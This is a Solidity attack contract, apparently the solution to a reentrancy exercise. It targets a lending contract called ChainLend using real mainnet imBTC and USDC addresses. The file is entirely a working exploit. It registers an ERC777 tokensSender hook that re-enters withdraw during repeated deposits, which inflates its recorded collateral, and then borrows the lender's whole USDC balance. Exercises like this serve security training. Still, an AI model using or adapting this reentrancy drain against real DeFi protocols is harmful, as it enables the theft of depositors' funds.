// SPDX-License-Identifier: GPL-3.0-or-later 
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

import "../reentrancy-3/ChainLend.sol";

contract Attack3  {

    ChainLend public chainlend;
    IERC20 public depToken;
    IERC20 public borToken;
    uint public numTimesSent;

    IERC1820Registry constant IERC1820REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    address public USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address public USDC_WHALE = address(0xF977814e90dA44bFA03b6295A0616a897441aceC);
    address public imBTC = address(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    address public imBTC_WHALE = address(0xFEa4224Da399F672eB21a9F3F7324cEF1d7a965C);
    constructor(address _chainlend){

        chainlend = ChainLend(_chainlend);
        depToken = IERC20(imBTC);
        borToken = IERC20(USDC);

        IERC1820REGISTRY.setInterfaceImplementer(
            address(this), 
            keccak256("ERC777TokensSender"),
            address(this)
            );
    }

    uint256 public borrowLimit;
    uint public initialBal;
    uint public currentimBTCBal;

    function attack() public {
        initialBal = depToken.balanceOf(address(this));
        borrowLimit = (initialBal * 20_000 * 1e6) / 1e8;
        borrowLimit =  ((borrowLimit * 80) / 100) ;


         for (uint8 i=1; i<=70; i++){
            if (chainlend.deposits(address(this)) >= 62500000000){
                chainlend.borrow(borToken.balanceOf(address(chainlend)));
                break;
            } 

            currentimBTCBal = depToken.balanceOf(address(this));
            depToken.approve(address(chainlend), (currentimBTCBal -1));
            chainlend.deposit(currentimBTCBal -1);

            depToken.approve(address(chainlend), 1);
            chainlend.deposit(1);
        }

        borrowLimit = (chainlend.deposits(address(this)) * 20_000 * 1e6) / 1e8;
        borrowLimit =  ((borrowLimit * 80) / 100);

        if (borrowLimit >= borToken.balanceOf(address(chainlend))){
            chainlend.borrow(borToken.balanceOf(address(chainlend)));
        } 
    }
    function tokensToSend(
        address,/* operator*/
        address,/* from*/
        address to,
        uint256,/* amount*/
        bytes calldata,
        bytes calldata
    ) external {
        numTimesSent++;

        if (numTimesSent %2 == 0 ){
            chainlend.withdraw(currentimBTCBal -1);

        }
    }
}
